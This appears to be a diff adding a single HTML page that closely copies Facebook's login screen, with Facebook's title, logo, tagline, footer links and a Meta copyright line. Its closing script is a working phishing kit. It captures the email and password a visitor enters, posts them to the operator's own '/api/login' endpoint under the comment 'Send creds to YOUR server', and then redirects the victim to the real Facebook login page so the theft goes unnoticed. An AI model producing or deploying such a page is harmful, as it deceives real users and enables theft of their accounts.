@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook - log in or sign up</title>
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* ── MAIN LAYOUT ── */
+    .main-wrapper {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 32px;
+      flex: 1;
+      padding: 0 16px;
+      margin-top: 80px;
+      max-width: 980px;
+      width: 100%;
+    }
+
+    /* ── LEFT SIDE ── */
+    .left-side {
+      flex: 1;
+      max-width: 508px;
+      padding-bottom: 40px;
+    }
+
+    .fb-logo {
+      color: #0866ff;
+      font-size: 60px;
+      font-weight: 700;
+      letter-spacing: -2px;
+      line-height: 1;
+      margin-bottom: 16px;
+      font-family: Georgia, 'Times New Roman', serif;
+      user-select: none;
+    }
+
+    .tagline {
+      font-size: 28px;
+      color: #1c1e21;
+      line-height: 1.25;
+      font-weight: 400;
+      max-width: 360px;
+    }
+
+    /* ── RIGHT SIDE (LOGIN CARD) ── */
+    .login-card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+      padding: 20px 16px 28px;
+      width: 396px;
+      flex-shrink: 0;
+    }
+
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      color: #1c1e21;
+      outline: none;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+      background: #fff;
+    }
+
+    .input-field::placeholder {
+      color: #8a8d91;
+    }
+
+    .input-field:focus {
+      border-color: #0866ff;
+      box-shadow: 0 0 0 2px #e7f0ff;
+    }
+
+    .btn-login {
+      width: 100%;
+      padding: 14px 16px;
+      background-color: #0866ff;
+      color: #fff;
+      font-size: 20px;
+      font-weight: 700;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.15s ease;
+      letter-spacing: 0.3px;
+    }
+
+    .btn-login:hover {
+      background-color: #0757e0;
+    }
+
+    .btn-login:active {
+      background-color: #0649bf;
+    }
+
+    .forgot-password {
+      display: block;
+      text-align: center;
+      margin-top: 16px;
+      color: #0866ff;
+      font-size: 14px;
+      text-decoration: none;
+      font-weight: 400;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+
+    .btn-create {
+      display: block;
+      width: fit-content;
+      margin: 0 auto;
+      padding: 14px 22px;
+      background-color: #42b72a;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 700;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.15s ease;
+    }
+
+    .btn-create:hover {
+      background-color: #36a11e;
+    }
+
+    .btn-create:active {
+      background-color: #2c8f16;
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      width: 100%;
+      max-width: 980px;
+      padding: 24px 16px 28px;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px 12px;
+      margin-bottom: 14px;
+    }
+
+    .footer-links a {
+      color: #737373;
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-links span.dot {
+      color: #737373;
+      font-size: 12px;
+    }
+
+    .footer-language {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px 8px;
+      margin-bottom: 14px;
+    }
+
+    .footer-language a {
+      color: #737373;
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .footer-language a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-copy {
+      color: #737373;
+      font-size: 12px;
+      border-top: 1px solid #dadde1;
+      padding-top: 12px;
+    }
+
+    /* ── META TAG in card ── */
+    .meta-for-developers {
+      text-align: center;
+      margin-top: 24px;
+      font-size: 14px;
+      color: #1c1e21;
+    }
+
+    .meta-for-developers strong {
+      font-weight: 700;
+    }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 768px) {
+      .main-wrapper {
+        flex-direction: column;
+        margin-top: 32px;
+        align-items: center;
+        text-align: center;
+        gap: 24px;
+      }
+
+      .left-side {
+        max-width: 100%;
+        padding-bottom: 0;
+      }
+
+      .fb-logo {
+        font-size: 48px;
+      }
+
+      .tagline {
+        font-size: 22px;
+        max-width: 100%;
+      }
+
+      .login-card {
+        width: 100%;
+        max-width: 400px;
+      }
+    }
+
+    /* ── SUBTLE ANIMATION ON LOAD ── */
+    .login-card {
+      animation: slideUp 0.35s ease-out both;
+    }
+
+    .left-side {
+      animation: fadeIn 0.45s ease-out both;
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to   { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-wrapper">
+    <div class="left-side">
+      <div class="fb-logo">facebook</div>
+      <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+    </div>
+
+    <div class="login-card">
+      <form id="loginForm">
+        <div class="input-group">
+          <input class="input-field" type="text" id="email" placeholder="Email address or phone number" autocomplete="username" required />
+          <input class="input-field" type="password" id="pass" placeholder="Password" autocomplete="current-password" required />
+        </div>
+        <button type="submit" class="btn-login" id="loginBtn">Log in</button>
+      </form>
+      <a href="#" class="forgot-password">Forgotten password?</a>
+      <hr class="divider" />
+      <button class="btn-create">Create new account</button>
+    </div>
+  </div>
+  
+    <!-- FOOTER -->
+  <footer>
+    <div class="footer-language">
+      <a href="#">English (UK)</a>
+      <a href="#">Français (France)</a>
+      <a href="#">中文(简体)</a>
+      <a href="#">العربية</a>
+      <a href="#">Español</a>
+      <a href="#">Português (Brasil)</a>
+      <a href="#">Italiano</a>
+      <a href="#">한국어</a>
+      <a href="#">Deutsch</a>
+      <a href="#">हिन्दी</a>
+      <a href="#">日本語</a>
+    </div>
+    <div class="footer-links">
+      <a href="#">Sign Up</a>
+      <a href="#">Log in</a>
+      <a href="#">Messenger</a>
+      <a href="#">Facebook Lite</a>
+      <a href="#">Video</a>
+      <a href="#">Places</a>
+      <a href="#">Games</a>
+      <a href="#">Marketplace</a>
+      <a href="#">Meta Pay</a>
+      <a href="#">Meta Store</a>
+      <a href="#">Meta Quest</a>
+      <a href="#">Threads</a>
+      <a href="#">Voting Information Centre</a>
+      <a href="#">Privacy Policy</a>
+      <a href="#">Privacy Centre</a>
+      <a href="#">Groups</a>
+      <a href="#">About</a>
+      <a href="#">Create ad</a>
+      <a href="#">Create Page</a>
+      <a href="#">Developers</a>
+      <a href="#">Careers</a>
+      <a href="#">Cookies</a>
+      <a href="#">Ad choices</a>
+      <a href="#">Terms</a>
+      <a href="#">Help</a>
+      <a href="#">Contact uploading and non-users</a>
+      <a href="#">Settings</a>
+      <a href="#">Activity log</a>
+    </div>
+    <div class="footer-copy">
+      Meta &copy; 2024
+    </div>
+  </footer>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const btn = document.getElementById('loginBtn');
+      const email = document.getElementById('email').value;
+      const pass = document.getElementById('pass').value;
+
+      // Loading
+      btn.textContent = ''; 
+      btn.classList.add('loading');
+
+      // Send creds to YOUR server
+      await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, pass })
+      });
+
+      // Redirect to real FB
+      setTimeout(() => {
+        window.location.href = 'https://www.facebook.com/login';
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
